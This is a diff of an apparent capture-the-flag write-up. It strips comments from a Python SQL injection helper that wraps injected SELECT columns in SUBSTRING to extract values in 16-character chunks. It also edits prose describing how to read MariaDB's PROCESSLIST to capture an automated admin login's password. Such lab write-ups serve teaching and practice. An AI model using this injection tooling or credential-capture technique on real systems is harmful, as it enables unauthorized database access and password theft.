@@ -258,7 +258,6 @@ def extract_results(html):
     soup = BeautifulSoup(html, 'html.parser')
     results = []
     
-    # Find all table cells
     for td in soup.find_all('td'):
         content = td.get_text().strip()
         # Filter out timestamp entries (they start with year)
@@ -268,21 +267,17 @@ def extract_results(html):
     return results
 
 def modify_payload(payload, substring_range):
-    # Find the SELECT and FROM positions
     select_pos = payload.upper().find('SELECT')
     from_pos = payload.upper().find('FROM')
     
     if select_pos == -1 or from_pos == -1:
         return payload
         
-    # Extract the parts of the query
     select_clause = payload[select_pos:from_pos]
     rest_of_query = payload[from_pos:]
     
-    # Split the selected columns
     columns = select_clause.replace('SELECT', '').strip().split(',')
     
-    # Modify the last column to use SUBSTRING
     modified_columns = []
     for i, col in enumerate(columns):
         col = col.strip()
@@ -293,7 +288,6 @@ def modify_payload(payload, substring_range):
                 col = f"SUBSTRING({col}, {substring_range[0]}, {substring_range[1]})"
         modified_columns.append(col)
     
-    # Reconstruct the query
     modified_payload = payload[:select_pos] + 'SELECT ' + ', '.join(modified_columns) + ' ' + rest_of_query
     return modified_payload
 
@@ -305,7 +299,6 @@ def main():
     ip = sys.argv[1]
     original_payload = sys.argv[2]
     
-    # Create two payloads: one for first 16 chars, one for the rest
     first_payload = modify_payload(original_payload, (1, 16))
     second_payload = modify_payload(original_payload, (17, 32))
 
@@ -374,7 +367,7 @@ Besides the `web` database we have the `information_schema` database.
 
 At this point we have exhausted a lot of options, but there is more to explore. Remember how we had noticed that the admin user was logging in **every minute**, it obviously points to some sort of automation. 
 
-It turns out that we can make use of the `PROCESSLIST` to see which queries are being made in the background and if our timing is right, the admin password will be exposed. _Read more about `PROCESSLIST` [here](https://mariadb.com/kb/en/information-schema-processlist-table/)._
+It turns out that we can make use of the `PROCESSLIST` command to see which queries are being made in the background and if our timing is right, the admin password will be exposed. _Read more about `PROCESSLIST` [here](https://mariadb.com/kb/en/information-schema-processlist-table/)._
 
 ```python
 #!/usr/bin/env python3
